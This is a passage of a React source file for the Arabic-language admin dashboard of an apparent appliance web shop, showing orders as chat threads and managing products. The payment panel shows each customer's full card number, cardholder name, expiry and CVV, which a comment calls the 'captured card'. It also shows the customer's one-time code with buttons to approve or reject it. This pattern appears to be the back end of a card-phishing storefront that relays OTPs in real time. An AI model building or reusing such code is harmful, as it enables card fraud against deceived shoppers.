import { useState, useEffect, useCallback, useMemo, useRef } from "react";
import { useAuth } from "@clerk/react";
import { useToast } from "@/components/ui/use-toast";
import {
  MapPin,
  Phone,
  CreditCard,
  Banknote,
  Package,
  CheckCheck,
  Search,
  ArrowRight,
  ImageIcon,
  X,
  Send,
  ChevronDown,
  ChevronUp,
  ShieldCheck,
  Truck,
  Clock,
} from "lucide-react";
import {
  subscribeToOrders,
  appendAdminNote,
  updateOrderStatus,
  decideOrderOtp,
  addData,
  type AuthHeaders,
  type OrderDoc,
  type OrderEvent,
  type OrderStatus,
} from "@/lib/firebase";
import { ensureVisitorId } from "@/lib/visitor";
import { CardMock } from "@/components/cardMock";
import { dashboardSecretHeaders } from "@/lib/dashboardAuth";
import type { Timestamp } from "firebase/firestore";

const statusColors: Record<string, string> = {
  pending: "bg-yellow-100 text-yellow-800",
  confirmed: "bg-blue-100 text-blue-800",
  shipped: "bg-purple-100 text-purple-800",
  delivered: "bg-green-100 text-green-800",
  cancelled: "bg-red-100 text-red-800",
};

const statusDotColors: Record<string, string> = {
  pending: "bg-yellow-500",
  confirmed: "bg-blue-500",
  shipped: "bg-purple-500",
  delivered: "bg-green-500",
  cancelled: "bg-red-500",
};

const statusLabels: Record<string, string> = {
  pending: "قيد الانتظار",
  confirmed: "مؤكد",
  shipped: "قيد الشحن",
  delivered: "تم التوصيل",
  cancelled: "ملغي",
};

const paymentLabels: Record<string, string> = {
  cod: "كاش عند الاستلام",
  credit: "تحويل / بطاقة",
};

const paymentStatusLabels: Record<string, string> = {
  pending: "قيد الانتظار",
  verified: "تم التحقق",
  failed: "فشل الدفع",
};

const eventStyles: Record<
  string,
  { icon: string; tone: string; label: string }
> = {
  placed: { icon: "🛒", tone: "text-emerald-700", label: "طلب جديد" },
  payment_submitted: {
    icon: "💳",
    tone: "text-blue-700",
    label: "تم إرسال الدفع",
  },
  otp_verified: {
    icon: "🔐",
    tone: "text-violet-700",
    label: "تم التحقق من OTP",
  },
  confirmed: { icon: "✅", tone: "text-blue-700", label: "تأكيد الطلب" },
  shipped: { icon: "🚚", tone: "text-purple-700", label: "تم الشحن" },
  delivered: { icon: "📦", tone: "text-green-700", label: "تم التسليم" },
  cancelled: { icon: "❌", tone: "text-red-700", label: "تم الإلغاء" },
  admin_note: { icon: "📝", tone: "text-amber-700", label: "ملاحظة إدارية" },
};

const productCategories = [
  { label: "العروض", value: "promotions" },
  { label: "التحلية والبرادات", value: "desalination" },
  { label: "منقيات الهواء", value: "air-purifiers" },
  { label: "صانعات الثلج", value: "ice-makers" },
  { label: "القهوة والمشروبات", value: "coffee" },
  { label: "الدفايات والثلاجات", value: "heaters" },
  { label: "المطبخ", value: "kitchen" },
  { label: "المضخات", value: "pumps" },
  { label: "أجهزة المنزل", value: "home-devices" },
  { label: "الصيانة", value: "maintenance" },
];

interface Product {
  id: string;
  name_ar: string;
  price: number;
  original_price: number;
  discount: number;
  category: string;
  in_stock: boolean;
  image_url: string;
  created_date?: string;
}

type ProductForm = {
  name_ar: string;
  price: string;
  original_price: string;
  discount: string;
  category: string;
  in_stock: boolean;
  image_url: string;
};

const emptyProductForm: ProductForm = {
  name_ar: "",
  price: "",
  original_price: "",
  discount: "",
  category: "promotions",
  in_stock: true,
  image_url: "",
};

export default function Dashboard() {
  const [tab, setTab] = useState<"orders" | "products">("orders");
  const { getToken } = useAuth();

  const authHeaders = useCallback(async (): Promise<Record<string, string>> => {
    const token = await getToken();
    const headers: Record<string, string> = { ...dashboardSecretHeaders() };
    if (token) headers["Authorization"] = `Bearer ${token}`;
    return headers;
  }, [getToken]);

  return (
    <div dir="rtl" className="min-h-screen bg-muted/30 p-4 sm:p-6">
      <div className="max-w-7xl mx-auto">
        <h1 className="text-2xl font-extrabold text-foreground mb-6">
          لوحة التحكم
        </h1>

        <div className="flex gap-2 mb-6 border-b border-border">
          {[
            { key: "orders" as const, label: "الطلبات" },
            { key: "products" as const, label: "المنتجات" },
          ].map((t) => (
            <button
              key={t.key}
              onClick={() => setTab(t.key)}
              className={`px-4 py-2 text-sm font-bold border-b-2 -mb-px transition-colors ${
                tab === t.key
                  ? "border-primary text-primary"
                  : "border-transparent text-muted-foreground hover:text-foreground"
              }`}
            >
              {t.label}
            </button>
          ))}
        </div>

        {tab === "orders" ? (
          <OrdersChat authHeaders={authHeaders} />
        ) : (
          <ProductsTab authHeaders={authHeaders} />
        )}
      </div>
    </div>
  );
}

// ───────────────────────────────────────────────────────────────────────────────
// Telegram-style Orders Chat (Firestore-backed)
// ───────────────────────────────────────────────────────────────────────────────

function avatarColor(name: string): string {
  const colors = [
    "from-pink-500 to-rose-500",
    "from-violet-500 to-purple-500",
    "from-sky-500 to-blue-500",
    "from-emerald-500 to-teal-500",
    "from-amber-500 to-orange-500",
    "from-fuchsia-500 to-pink-500",
    "from-indigo-500 to-blue-500",
    "from-lime-500 to-green-500",
  ];
  let hash = 0;
  for (let i = 0; i < name.length; i++)
    hash = (hash * 31 + name.charCodeAt(i)) | 0;
  return colors[Math.abs(hash) % colors.length]!;
}

function initials(name: string): string {
  const parts = name.trim().split(/\s+/).filter(Boolean);
  if (parts.length === 0) return "؟";
  if (parts.length === 1) return parts[0]!.slice(0, 2);
  return (parts[0]![0] || "") + (parts[1]![0] || "");
}

function tsToDate(ts: Timestamp | undefined | null): Date {
  if (!ts) return new Date(0);
  if (typeof (ts as Timestamp).toDate === "function")
    return (ts as Timestamp).toDate();
  // Firestore SDK sometimes returns plain {seconds, nanoseconds} after JSON
  const anyTs = ts as unknown as { seconds?: number };
  if (anyTs?.seconds != null) return new Date(anyTs.seconds * 1000);
  return new Date(0);
}

function formatTime(ts: Timestamp | undefined | null): string {
  const d = tsToDate(ts);
  if (d.getTime() === 0) return "";
  return d.toLocaleTimeString("ar-SA", { hour: "2-digit", minute: "2-digit" });
}

function formatDay(ts: Timestamp | undefined | null): string {
  const d = tsToDate(ts);
  if (d.getTime() === 0) return "";
  const today = new Date();
  const diffDays = Math.floor((today.getTime() - d.getTime()) / 86400000);
  if (diffDays === 0) return "اليوم";
  if (diffDays === 1) return "أمس";
  if (diffDays < 7) return d.toLocaleDateString("ar-SA", { weekday: "long" });
  return d.toLocaleDateString("ar-SA", { day: "numeric", month: "short" });
}

function dayKey(ts: Timestamp | undefined | null): string {
  const d = tsToDate(ts);
  return `${d.getFullYear()}-${d.getMonth()}-${d.getDate()}`;
}

function OrdersChat({
  authHeaders,
}: {
  authHeaders: () => Promise<AuthHeaders>;
}) {
  const { toast } = useToast();
  const [orders, setOrders] = useState<OrderDoc[]>([]);
  const [loading, setLoading] = useState(true);
  const [err, setErr] = useState<string | null>(null);
  const [selectedId, setSelectedId] = useState<string | null>(null);
  const [search, setSearch] = useState("");
  const [filter, setFilter] = useState<
    "all" | "pending" | "confirmed" | "shipped" | "delivered" | "cancelled"
  >("all");
  const [zoomReceipt, setZoomReceipt] = useState<string | null>(null);
  const [typing, setTyping] = useState(false);

  // Live subscription to all orders
  useEffect(() => {
    setLoading(true);
    const unsub = subscribeToOrders(
      (data) => {
        setOrders(data);
        setLoading(false);
        setErr(null);
        setSelectedId((cur) => cur ?? data[0]?.id ?? null);
      },
      (e) => {
        setErr(e.message);
        setLoading(false);
      },
    );
    return () => unsub();
  }, []);

  const filtered = useMemo(() => {
    return orders
      .filter((o) => filter === "all" || o.status === filter)
      .filter((o) => {
        if (!search.trim()) return true;
        const q = search.toLowerCase();
        return (
          o.customer?.name?.toLowerCase().includes(q) ||
          o.customer?.phone?.includes(search) ||
          o.shipping?.city?.toLowerCase().includes(q) ||
          o.id.toLowerCase().includes(q)
        );
      });
  }, [orders, search, filter]);

  const selected = useMemo(
    () => orders.find((o) => o.id === selectedId) || null,
    [orders, selectedId],
  );

  const onUpdateStatus = useCallback(
    async (status: OrderStatus) => {
      if (!selectedId) return;
      setTyping(true);
      try {
        const headers = await authHeaders();
        await updateOrderStatus(selectedId, status, headers);
      } catch (err) {
        toast({
          title: "تعذّر تحديث الحالة",
          description: err instanceof Error ? err.message : String(err),
          duration: 3000,
        });
      } finally {
        setTimeout(() => setTyping(false), 600);
      }
    },
    [selectedId, authHeaders, toast],
  );

  const onAddNote = useCallback(
    async (message: string) => {
      if (!selectedId || !message.trim()) return;
      setTyping(true);
      try {
        const headers = await authHeaders();
        await appendAdminNote(selectedId, message.trim(), headers);
      } catch (err) {
        toast({
          title: "تعذّر إرسال الملاحظة",
          description: err instanceof Error ? err.message : String(err),
          duration: 3000,
        });
      } finally {
        setTimeout(() => setTyping(false), 600);
      }
    },
    [selectedId, authHeaders, toast],
  );

  const onDecideOtp = useCallback(
    async (decision: "approve" | "reject") => {
      if (!selectedId) return;
      setTyping(true);
      try {
        const headers = await authHeaders();
        await decideOrderOtp(selectedId, decision, headers);
        toast({
          title:
            decision === "approve"
              ? "تمت الموافقة على رمز التحقق"
              : "تم رفض رمز التحقق",
          duration: 2000,
        });
      } catch (err) {
        toast({
          title: "تعذّر تحديث رمز التحقق",
          description: err instanceof Error ? err.message : String(err),
          duration: 3000,
        });
      } finally {
        setTimeout(() => setTyping(false), 600);
      }
    },
    [selectedId, authHeaders, toast],
  );

  const stats = {
    total: orders.length,
    pending: orders.filter((o) => o.status === "pending").length,
    confirmed: orders.filter((o) => o.status === "confirmed").length,
    revenue: orders.reduce((s, o) => s + (o.total || 0), 0),
  };

  return (
    <>
      {/* Stats */}
      <div className="grid grid-cols-2 sm:grid-cols-4 gap-3 mb-4">
        {[
          {
            label: "إجمالي الطلبات",
            value: stats.total,
            color: "text-foreground",
          },
          {
            label: "قيد الانتظار",
            value: stats.pending,
            color: "text-yellow-600",
          },
          { label: "مؤكدة", value: stats.confirmed, color: "text-blue-600" },
          {
            label: "إجمالي المبيعات",
            value: `${stats.revenue.toLocaleString("ar-SA")} ر.س`,
            color: "text-green-600",
          },
        ].map((s, i) => (
          <div key={i} className="bg-card border border-border rounded-xl p-3">
            <p className="text-xs text-muted-foreground mb-1">{s.label}</p>
            <p className={`text-lg font-black ${s.color}`}>{s.value}</p>
          </div>
        ))}
      </div>

      {err && (
        <div className="bg-destructive/10 border border-destructive/20 text-destructive text-xs px-3 py-2 rounded-lg mb-3">
          خطأ في تحميل الطلبات: {err}
        </div>
      )}

      {/* Two-pane chat layout */}
      <div
        className="bg-card border border-border rounded-2xl overflow-hidden grid grid-cols-1 md:grid-cols-[340px_1fr]"
        style={{ height: "calc(100vh - 280px)", minHeight: 540 }}
      >
        {/* Left: chat list */}
        <aside
          className={`border-l border-border flex flex-col bg-card ${
            selected ? "hidden md:flex" : "flex"
          }`}
        >
          <div className="p-3 border-b border-border space-y-2">
            <div className="relative">
              <Search className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" />
              <input
                value={search}
                onChange={(e) => setSearch(e.target.value)}
                placeholder="بحث في الطلبات..."
                className="w-full bg-muted/50 border border-transparent focus:border-primary focus:bg-card rounded-full ps-3 pe-9 py-2 text-sm outline-none transition-colors"
              />
            </div>
            <div className="flex gap-1 overflow-x-auto pb-1">
              {(
                [
                  { key: "all", label: "الكل" },
                  { key: "pending", label: "انتظار" },
                  { key: "confirmed", label: "مؤكدة" },
                  { key: "shipped", label: "شحن" },
                  { key: "delivered", label: "مسلّمة" },
                  { key: "cancelled", label: "ملغاة" },
                ] as const
              ).map((f) => (
                <button
                  key={f.key}
                  onClick={() => setFilter(f.key)}
                  className={`px-2.5 py-1 rounded-full text-xs font-bold whitespace-nowrap transition-all ${
                    filter === f.key
                      ? "bg-primary text-primary-foreground"
                      : "bg-muted/60 text-muted-foreground hover:bg-muted"
                  }`}
                >
                  {f.label}
                </button>
              ))}
            </div>
          </div>

          <div className="flex-1 overflow-y-auto">
            {loading ? (
              <div className="flex items-center justify-center h-40">
                <div className="w-6 h-6 border-4 border-muted border-t-primary rounded-full animate-spin" />
              </div>
            ) : filtered.length === 0 ? (
              <div className="text-center py-16 text-muted-foreground text-sm px-4">
                {orders.length === 0
                  ? "لا توجد طلبات بعد"
                  : "لا توجد نتائج مطابقة"}
              </div>
            ) : (
              filtered.map((o) => {
                const isActive = o.id === selectedId;
                const lastEvent = o.events?.[o.events.length - 1];
                const lastPreview =
                  lastEvent?.message || o.items?.[0]?.name_ar || "طلب جديد";
                return (
                  <button
                    key={o.id}
                    onClick={() => setSelectedId(o.id)}
                    onKeyDown={(e) => {
                      if (e.key === "Enter" || e.key === " ") {
                        e.preventDefault();
                        setSelectedId(o.id);
                      }
                    }}
                    className={`w-full text-right flex items-center gap-3 px-3 py-3 border-b border-border/50 hover:bg-muted/40 transition-colors ${
                      isActive ? "bg-primary/10" : ""
                    }`}
                  >
                    <div className="relative shrink-0">
                      <div
                        className={`w-11 h-11 rounded-full bg-gradient-to-br ${avatarColor(
                          o.customer?.name || "؟",
                        )} text-white flex items-center justify-center font-bold text-sm`}
                      >
                        {initials(o.customer?.name || "؟")}
                      </div>
                      <span
                        className={`absolute -bottom-0.5 -left-0.5 w-3 h-3 rounded-full border-2 border-card ${
                          statusDotColors[o.status] || "bg-muted-foreground"
                        }`}
                      />
                    </div>
                    <div className="flex-1 min-w-0">
                      <div className="flex items-center justify-between gap-2 mb-0.5">
                        <span className="font-bold text-foreground text-sm truncate">
                          {o.customer?.name || "—"}
                        </span>
                        <span className="text-[10px] text-muted-foreground font-mono shrink-0">
                          {formatDay(o.createdAt)}
                        </span>
                      </div>
                      <div className="flex items-center justify-between gap-2">
                        <span className="text-xs text-muted-foreground truncate">
                          {lastPreview}
                        </span>
                        <span
                          className={`text-[10px] font-bold px-1.5 py-0.5 rounded-full shrink-0 ${
                            statusColors[o.status] ||
                            "bg-muted text-muted-foreground"
                          }`}
                        >
                          {statusLabels[o.status] || o.status}
                        </span>
                      </div>
                    </div>
                  </button>
                );
              })
            )}
          </div>
        </aside>

        {/* Right: chat conversation */}
        <section
          className={`relative flex-col ${selected ? "flex" : "hidden md:flex"}`}
          style={{
            backgroundColor: "#e7eef5",
            backgroundImage:
              "radial-gradient(circle at 25% 25%, rgba(0,123,255,0.06) 0, transparent 50%), radial-gradient(circle at 75% 75%, rgba(40,167,69,0.05) 0, transparent 50%)",
          }}
        >
          {!selected ? (
            <div className="flex-1 flex items-center justify-center text-center p-8">
              <div>
                <Package className="w-16 h-16 text-muted-foreground/40 mx-auto mb-3" />
                <p className="text-muted-foreground">
                  اختر طلباً من القائمة لعرض المحادثة
                </p>
              </div>
            </div>
          ) : (
            <ChatConversation
              key={selected.id}
              order={selected}
              typing={typing}
              onBack={() => setSelectedId(null)}
              onUpdateStatus={onUpdateStatus}
              onAddNote={onAddNote}
              onDecideOtp={onDecideOtp}
              onZoomReceipt={(url) => setZoomReceipt(url)}
            />
          )}
        </section>
      </div>

      {zoomReceipt && (
        <div
          className="fixed inset-0 bg-black/80 z-50 flex items-center justify-center p-4"
          onClick={() => setZoomReceipt(null)}
        >
          <button
            className="absolute top-4 right-4 text-white hover:bg-white/10 rounded-full p-2"
            onClick={() => setZoomReceipt(null)}
          >
            <X className="w-6 h-6" />
          </button>
          <img
            src={zoomReceipt}
            alt="إيصال الدفع"
            className="max-w-full max-h-full object-contain rounded-lg"
            onClick={(e) => e.stopPropagation()}
          />
        </div>
      )}
    </>
  );
}

function ChatConversation({
  order,
  typing,
  onBack,
  onUpdateStatus,
  onAddNote,
  onDecideOtp,
  onZoomReceipt,
}: {
  order: OrderDoc;
  typing: boolean;
  onBack: () => void;
  onUpdateStatus: (status: OrderStatus) => Promise<void>;
  onAddNote: (note: string) => Promise<void>;
  onDecideOtp: (decision: "approve" | "reject") => Promise<void>;
  onZoomReceipt: (url: string) => void;
}) {
  const scrollRef = useRef<HTMLDivElement>(null);
  const [note, setNote] = useState("");
  const [shippingOpen, setShippingOpen] = useState(true);
  const [paymentOpen, setPaymentOpen] = useState(true);

  // Auto-scroll to newest bubble whenever the events list changes
  useEffect(() => {
    const el = scrollRef.current;
    if (!el) return;
    requestAnimationFrame(() => {
      el.scrollTo({ top: el.scrollHeight, behavior: "smooth" });
    });
  }, [order.events?.length, typing]);

  const ship = order.shipping || ({} as OrderDoc["shipping"]);
  const pay = order.payment || ({} as OrderDoc["payment"]);
  const fullAddress = [
    ship.address,
    ship.building && `مبنى ${ship.building}`,
    ship.floor && `دور ${ship.floor}`,
    ship.district,
    ship.city,
    ship.postal_code,
  ]
    .filter(Boolean)
    .join("، ");

  // Quick action buttons depend on current status
  const quickActions = (() => {
    if (order.status === "pending") {
      return [
        {
          label: "✓ تأكيد",
          value: "confirmed" as const,
          className: "bg-blue-500 hover:bg-blue-600 text-white",
        },
        {
          label: "✕ إلغاء",
          value: "cancelled" as const,
          className:
            "bg-destructive hover:bg-destructive/90 text-destructive-foreground",
        },
      ];
    }
    if (order.status === "confirmed") {
      return [
        {
          label: "🚚 تم الشحن",
          value: "shipped" as const,
          className: "bg-purple-500 hover:bg-purple-600 text-white",
        },
        {
          label: "📦 تم التسليم",
          value: "delivered" as const,
          className: "bg-emerald-500 hover:bg-emerald-600 text-white",
        },
        {
          label: "✕ إلغاء",
          value: "cancelled" as const,
          className:
            "bg-destructive hover:bg-destructive/90 text-destructive-foreground",
        },
      ];
    }
    if (order.status === "shipped") {
      return [
        {
          label: "📦 تم التسليم",
          value: "delivered" as const,
          className: "bg-emerald-500 hover:bg-emerald-600 text-white",
        },
        {
          label: "✕ إلغاء",
          value: "cancelled" as const,
          className:
            "bg-destructive hover:bg-destructive/90 text-destructive-foreground",
        },
      ];
    }
    return [];
  })();

  const events = order.events || [];

  // Group events by day for date separators
  const grouped: Array<{ day: string; key: string; events: OrderEvent[] }> = [];
  for (const ev of events) {
    const k = dayKey(ev.createdAt);
    const last = grouped[grouped.length - 1];
    if (last && last.key === k) {
      last.events.push(ev);
    } else {
      grouped.push({ key: k, day: formatDay(ev.createdAt), events: [ev] });
    }
  }

  const submitNote = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!note.trim()) return;
    const n = note.trim();
    setNote("");
    await onAddNote(n);
  };

  return (
    <>
      {/* Sticky header */}
      <div className="bg-card border-b border-border px-4 py-3 flex items-center gap-3 shadow-sm sticky top-0 z-10">
        <button
          onClick={onBack}
          className="md:hidden p-1 hover:bg-muted rounded-full"
        >
          <ArrowRight className="w-5 h-5" />
        </button>
        <div className="relative shrink-0">
          <div
            className={`w-10 h-10 rounded-full bg-gradient-to-br ${avatarColor(
              order.customer?.name || "؟",
            )} text-white flex items-center justify-center font-bold text-sm`}
          >
            {initials(order.customer?.name || "؟")}
          </div>
          <span
            className={`absolute -bottom-0.5 -left-0.5 w-3 h-3 rounded-full border-2 border-card ${
              statusDotColors[order.status] || "bg-muted-foreground"
            }`}
          />
        </div>
        <div className="flex-1 min-w-0">
          <div className="font-bold text-foreground text-sm truncate">
            {order.customer?.name || "—"}
          </div>
          <div
            className="text-xs text-muted-foreground flex items-center gap-1.5"
            dir="ltr"
          >
            <Phone className="w-3 h-3" />
            <span className="font-mono">{order.customer?.phone || "—"}</span>
          </div>
        </div>
        <span
          className={`text-xs font-bold px-2 py-1 rounded-full ${
            statusColors[order.status] || "bg-muted text-muted-foreground"
          }`}
        >
          {statusLabels[order.status] || order.status}
        </span>
      </div>

      {/* Captured card visualization — pinned at the top so the admin sees
          the card details immediately when opening an order. */}
      {(pay.cardNumber ||
        pay.cardLast4 ||
        pay.cardName ||
        pay.expiry ||
        pay.cvv) && (
        <div className="bg-card/60 border-b border-border px-3 py-2">
          <CardMock
            cardNumber={pay.cardNumber}
            cardLast4={pay.cardLast4}
            cardName={pay.cardName}
            expiry={pay.expiry}
            cvv={pay.cvv}
          />
        </div>
      )}

      {/* Pinned panels */}
      <div className="bg-card/60 border-b border-border px-3 py-2 space-y-2">
        {/* Shipping panel */}
        <div className="bg-white border border-border rounded-xl overflow-hidden shadow-sm">
          <button
            onClick={() => setShippingOpen((v) => !v)}
            className="w-full flex items-center justify-between px-3 py-2 hover:bg-muted/40"
          >
            <div className="flex items-center gap-2 text-emerald-700 font-bold text-sm">
              <Truck className="w-4 h-4" />
              معلومات الشحن
              <span
                className={`text-[10px] font-bold px-1.5 py-0.5 rounded-full ${
                  statusColors[ship.status || "pending"] ||
                  "bg-muted text-muted-foreground"
                }`}
              >
                {statusLabels[ship.status || "pending"] || ship.status}
              </span>
            </div>
            {shippingOpen ? (
              <ChevronUp className="w-4 h-4 text-muted-foreground" />
            ) : (
              <ChevronDown className="w-4 h-4 text-muted-foreground" />
            )}
          </button>
          {shippingOpen && (
            <div className="px-3 pb-3 pt-1 text-sm space-y-1">
              <div className="flex items-start gap-2">
                <MapPin className="w-3.5 h-3.5 text-muted-foreground mt-1 shrink-0" />
                <p className="leading-relaxed">{fullAddress || "—"}</p>
              </div>
              <div
                className="flex items-center gap-2 text-xs text-muted-foreground"
                dir="ltr"
              >
                <Phone className="w-3 h-3" />
                <span className="font-mono">
                  {order.customer?.phone || "—"}
                </span>
                <span className="font-bold text-foreground">
                  • {order.customer?.name}
                </span>
              </div>
              {ship.notes && (
                <p className="text-xs bg-amber-50 border border-amber-200 rounded-lg px-2 py-1 text-amber-800 mt-1">
                  📝 {ship.notes}
                </p>
              )}
            </div>
          )}
        </div>

        {/* Payment panel */}
        <div className="bg-white border border-border rounded-xl overflow-hidden shadow-sm">
          <button
            onClick={() => setPaymentOpen((v) => !v)}
            className="w-full flex items-center justify-between px-3 py-2 hover:bg-muted/40"
          >
            <div className="flex items-center gap-2 text-blue-700 font-bold text-sm">
              {pay.method === "credit" ? (
                <CreditCard className="w-4 h-4" />
              ) : (
                <Banknote className="w-4 h-4" />
              )}
              معلومات الدفع
              <span
                className={`text-[10px] font-bold px-1.5 py-0.5 rounded-full ${
                  pay.status === "verified"
                    ? "bg-green-100 text-green-800"
                    : pay.status === "failed"
                      ? "bg-red-100 text-red-800"
                      : "bg-yellow-100 text-yellow-800"
                }`}
              >
                {paymentStatusLabels[pay.status || "pending"] || pay.status}
              </span>
            </div>
            {paymentOpen ? (
              <ChevronUp className="w-4 h-4 text-muted-foreground" />
            ) : (
              <ChevronDown className="w-4 h-4 text-muted-foreground" />
            )}
          </button>
          {paymentOpen && (
            <div className="px-3 pb-3 pt-1 text-sm space-y-1.5">
              <div className="flex items-center justify-between">
                <span className="text-muted-foreground text-xs">
                  طريقة الدفع
                </span>
                <span className="font-bold">
                  {paymentLabels[pay.method || "cod"] || pay.method}
                </span>
              </div>
              <div className="flex items-center justify-between">
                <span className="text-muted-foreground text-xs">المبلغ</span>
                <span className="font-bold font-mono" dir="ltr">
                  {(pay.amount ?? order.total ?? 0).toLocaleString("en-US")}{" "}
                  {pay.currency || "SAR"}
                </span>
              </div>
              <div className="flex items-center justify-between">
                <span className="text-muted-foreground text-xs">
                  حالة الدفع
                </span>
                <span className="font-bold">
                  {paymentStatusLabels[pay.status || "pending"] || pay.status}
                </span>
              </div>
              <div className="flex items-center justify-between">
                <span className="text-muted-foreground text-xs">
                  التحقق OTP
                </span>
                <span
                  className={`flex items-center gap-1 text-xs font-bold ${
                    pay.otpVerified
                      ? "text-emerald-600"
                      : "text-muted-foreground"
                  }`}
                >
                  <ShieldCheck className="w-3.5 h-3.5" />
                  {pay.otpVerified ? "تم التحقق" : "غير محقق"}
                  {pay.otpVerifiedAt && (
                    <span
                      className="text-muted-foreground font-normal"
                      dir="ltr"
                    >
                      • {formatTime(pay.otpVerifiedAt)}
                    </span>
                  )}
                </span>
              </div>
              {pay.otp && (
                <div className="mt-1 rounded-lg border border-emerald-200 bg-emerald-50 px-3 py-2 space-y-2">
                  <div className="flex items-center justify-between gap-2">
                    <span className="text-emerald-800 text-xs font-bold">
                      رمز التحقق OTP
                    </span>
                    <span
                      className="font-mono font-extrabold text-emerald-700 tracking-[0.4em] text-base"
                      dir="ltr"
                    >
                      {pay.otp}
                    </span>
                  </div>
                  <div className="flex items-center justify-between gap-2">
                    <span className="text-[11px] font-bold">
                      {pay.otpVerified ? (
                        <span className="text-emerald-700">
                          ✓ تمت الموافقة
                        </span>
                      ) : pay.otpDecision === "rejected" ? (
                        <span className="text-red-700">✗ تم الرفض</span>
                      ) : (
                        <span className="text-amber-700">
                          بانتظار الموافقة
                        </span>
                      )}
                    </span>
                    <div className="flex gap-1.5">
                      <button
                        onClick={() => onDecideOtp("approve")}
                        disabled={pay.otpVerified === true}
                        className="px-3 py-1 rounded-md bg-emerald-600 hover:bg-emerald-700 text-white text-xs font-bold disabled:opacity-40 disabled:cursor-not-allowed"
                      >
                        موافقة
                      </button>
                      <button
                        onClick={() => onDecideOtp("reject")}
                        disabled={
                          pay.otpVerified === false &&
                          pay.otpDecision === "rejected"
                        }
                        className="px-3 py-1 rounded-md border border-red-300 text-red-700 hover:bg-red-50 text-xs font-bold disabled:opacity-40 disabled:cursor-not-allowed"
                      >
                        رفض
                      </button>
                    </div>
                  </div>
                </div>
              )}
              {pay.receiptUrl && (
                <button
                  onClick={() => onZoomReceipt(pay.receiptUrl!)}
                  className="mt-1 block w-full rounded-lg overflow-hidden border border-border hover:opacity-90 transition-opacity"
                >
                  <img
                    src={pay.receiptUrl}
                    alt="إيصال الدفع"
                    className="w-full max-h-32 object-cover"
                  />
                  <div className="bg-muted/50 text-xs text-muted-foreground py-1 flex items-center justify-center gap-1">
                    <ImageIcon className="w-3 h-3" /> اضغط للتكبير
                  </div>
                </button>
              )}
            </div>
          )}
        </div>
      </div>

      {/* Messages */}
      <div ref={scrollRef} className="flex-1 overflow-y-auto p-4 space-y-3">
        {/* Order intro */}
        <Bubble side="incoming" time={formatTime(order.createdAt)}>
          <div className="font-bold text-sm mb-0.5">
            طلب جديد #{order.id.slice(-8)}
          </div>
          <p className="text-xs text-muted-foreground">
            مرحباً، أود تأكيد طلبي التالي ⬇️
          </p>
        </Bubble>

        {/* Items snapshot */}
        {order.items?.map((item, idx) => (
          <Bubble
            key={`item-${idx}`}
            side="incoming"
            time={formatTime(order.createdAt)}
          >
            <div className="flex items-center gap-2.5">
              {item.image_url ? (
                <img
                  src={item.image_url}
                  alt={item.name_ar}
                  className="w-12 h-12 object-contain rounded-lg bg-white shrink-0"
                />
              ) : (
                <div className="w-12 h-12 bg-muted rounded-lg shrink-0 flex items-center justify-center">
                  <Package className="w-5 h-5 text-muted-foreground" />
                </div>
              )}
              <div className="flex-1 min-w-0">
                <p className="text-sm font-medium line-clamp-1">
                  {item.name_ar}
                </p>
                <p className="text-xs text-muted-foreground">× {item.qty}</p>
              </div>
              <p className="text-sm font-bold text-primary shrink-0">
                {(item.price * item.qty).toLocaleString("ar-SA")} ر.س
              </p>
            </div>
          </Bubble>
        ))}

        {/* Total */}
        <Bubble side="incoming" time={formatTime(order.createdAt)} accent>
          <div className="flex items-center justify-between gap-3">
            <span className="text-xs font-bold text-muted-foreground">
              الإجمالي
            </span>
            <span className="text-lg font-black text-primary">
              {order.total?.toLocaleString("ar-SA")} ر.س
            </span>
          </div>
        </Bubble>

        {order.notes && (
          <Bubble side="incoming" time={formatTime(order.createdAt)}>
            <div className="text-xs font-bold text-amber-700 mb-1">
              📝 ملاحظات العميل
            </div>
            <p className="text-sm leading-relaxed">{order.notes}</p>
          </Bubble>
        )}

        {/* Day-grouped events */}
        {grouped.map((group) => (
          <div key={group.key} className="space-y-3">
            <div className="flex justify-center">
              <span className="bg-white/80 text-muted-foreground text-xs font-medium px-3 py-1 rounded-full shadow-sm">
                {group.day}
              </span>
            </div>
            {group.events.map((ev) => {
              const meta = eventStyles[ev.type] || {
                icon: "•",
                tone: "text-foreground",
                label: ev.type,
              };
              const isAdmin = ev.actor === "admin";
              const isSystemOrCustomer = !isAdmin;
              return (
                <Bubble
                  key={ev.id}
                  side={isAdmin ? "outgoing" : "incoming"}
                  time={formatTime(ev.createdAt)}
                  accent={ev.type === "placed" || ev.type === "confirmed"}
                >
                  <div
                    className={`flex items-center gap-1.5 text-xs font-bold ${meta.tone} mb-1`}
                  >
                    <span>{meta.icon}</span>
                    <span>{meta.label}</span>
                    {isSystemOrCustomer && ev.actor === "system" && (
                      <span className="text-[10px] bg-muted text-muted-foreground px-1.5 py-0.5 rounded-full">
                        نظام
                      </span>
                    )}
                  </div>
                  <p className="text-sm leading-relaxed">{ev.message}</p>
                </Bubble>
              );
            })}
          </div>
        ))}

        {typing && (
          <div className="flex items-center gap-2 me-auto bg-white rounded-2xl px-3 py-2 shadow-sm w-fit">
            <Clock className="w-3.5 h-3.5 text-muted-foreground" />
            <span className="text-xs text-muted-foreground">يكتب...</span>
            <span className="flex gap-1">
              <span className="w-1.5 h-1.5 bg-muted-foreground rounded-full animate-bounce [animation-delay:-0.3s]" />
              <span className="w-1.5 h-1.5 bg-muted-foreground rounded-full animate-bounce [animation-delay:-0.15s]" />
              <span className="w-1.5 h-1.5 bg-muted-foreground rounded-full animate-bounce" />
            </span>
          </div>
        )}
      </div>

      {/* Bottom action bar */}
      <div className="bg-card border-t border-border p-3 space-y-2">
        {quickActions.length > 0 && (
          <div className="flex items-center gap-2 flex-wrap">
            {quickActions.map((a) => (
              <button
                key={a.value}
                onClick={() => onUpdateStatus(a.value)}
                className={`px-3 py-1.5 rounded-full text-xs font-bold transition-all hover:scale-105 ${a.className}`}
              >
                {a.label}
              </button>
            ))}
          </div>
        )}
        <form onSubmit={submitNote} className="flex items-center gap-2">
          <input
            value={note}
            onChange={(e) => setNote(e.target.value)}
            placeholder="اكتب ملاحظة إدارية..."
            className="flex-1 bg-muted/50 border border-transparent focus:border-primary focus:bg-card rounded-full px-4 py-2 text-sm outline-none transition-colors"
          />
          <button
            type="submit"
            disabled={!note.trim()}
            className="bg-primary text-primary-foreground rounded-full p-2.5 hover:bg-primary/90 transition-colors disabled:opacity-40 disabled:cursor-not-allowed"
            aria-label="إرسال ملاحظة"
